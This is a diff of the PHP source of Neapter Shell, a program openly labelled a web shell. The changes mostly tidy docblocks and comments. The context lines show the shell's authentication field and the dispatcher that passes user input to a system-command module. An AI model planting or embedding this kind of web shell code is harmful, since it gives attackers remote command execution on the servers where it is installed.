@@ -3,10 +3,13 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
@@ -47,18 +50,17 @@ require_once dirname(__FILE__) . '/Args.php';
 require_once dirname(__FILE__) . '/Utils.php';
 
 /**
- * class Shell - Zarzadzanie serwerem
+ * NeapterSHell - WebShell, PHP Server manager
  *
+ * @category  WebShell
+ * @package   NeapterShell
+ * @version   1.0.0-dev
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @version 1.0.0-dev
- *
- * @package NeapterShell
- *
- * @uses Arr
- * @uses Request
- * @uses Form
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
+ * @link    http://www.php.net/manual/en/class.recursivedirectoryiterator.php#101654
  */
 class Shell
 {
@@ -72,16 +74,14 @@ class Shell
      *
      * format: sha1( $sUser . "\xff" . $sPass );
      *
-     * @access protected
-     * @var    string
+     * @var string
      */
     protected $sAuth;
 
     /**
      * Czas generowania strony
      *
-     * @access protected
-     * @var    float
+     * @var float
      */
     protected $fGeneratedIn;
 
@@ -89,40 +89,35 @@ class Shell
      * Nazwa polecenie
      * ':test' => 'test'
      *
-     * @access protected
-     * @var    string
+     * @var string
      */
     protected $sCmd;
 
     /**
      * Parsowanie argumentow
      *
-     * @access protected
-     * @var    object
+     * @var object
      */
     protected $oArgs;
 
     /**
      * Zestaw narzędzie
      *
-     * @access protected
-     * @ver    object
+     * @var object
      */
     protected $oUtils;
 
     /**
      * Jezeli true to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
      *
-     * @access public
-     * @var    boolean
+     * @var boolean
      */
     protected $bDev = false;
 
     /**
      * Jezeli false to skrypty JavaScript sa wlaczone
      *
-     * @access public
-     * @var    boolean
+     * @var boolean
      */
     protected $bNoJs = false;
 
@@ -130,7 +125,6 @@ class Shell
      * Konstruktor
      *
      * @param string $sArgs Arguments to execute commands
-     * @access public
      */
     public function __construct($sArgs = null)
     {
@@ -277,8 +271,7 @@ class Shell
     /**
      * Pobieranie statusu TAK / NIE
      *
-     * @access private
-     * @param  boolean $bValue Wartosc
+     * @param  boolean $bValue    Wartosc
      * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
      * @return string             Status
      */
@@ -294,7 +287,6 @@ class Shell
     /**
      * Pobieranie menu
      *
-     * @access private
      * @return string  Menu w HTMLu
      */
     private function getMenu()
@@ -322,7 +314,6 @@ class Shell
      *
      * @param string $sCmd Command to execute
      *
-     * @access public
      * @return string
      */
     public function getCommandOutput($sCmd = null)
@@ -390,9 +381,7 @@ class Shell
             }
         } elseif ($sCmd === '') {
             $sConsole = 'Wpisz ":help", by zobaczyć pomoc';
-        /**
-         * Execute system command
-         */
+            /* Execute system command */
         } elseif (class_exists('ModuleSystem')) {
             $this->oArgs = new Args(preg_replace('~^:[^ ]+\s+~', '', $sCmd));
             $oSystem = new ModuleSystem($this, $this->oUtils, $this->oArgs);
@@ -420,18 +409,12 @@ class Shell
     /**
      * Pobieranie calosci strony
      *
-     * @uses   Request
-     *
-     * @access private
-     * @param  string $sData Zawartosc strony
+     * @param  string  $sData         Zawartosc strony
      * @param  boolean $bExdendedInfo [Optional]<br>Czy wyswietlac informacje o wersji PHP, zaladowanych modulach itp
      * @return string
      */
     private function getContent($sData, $bExdendedInfo = true)
     {
-        /**
-         * isAjax
-         */
         if (Request::isAjax()) {
             preg_match('~<pre id="console">(.*)</pre>~s', $sData, $aMatch);
 
@@ -442,9 +425,6 @@ class Shell
             return $aMatch[1];
         }
 
-        /**
-         * Wylaczenie JavaScript
-         */
         $sScript = null;
         if (!$this->bNoJs) {
             $sScript = '<script src="?js"></script>';
@@ -490,7 +470,6 @@ class Shell
     /**
      * Wyswietlanie strony
      *
-     * @access private
      * @return void
      */
     public function get()
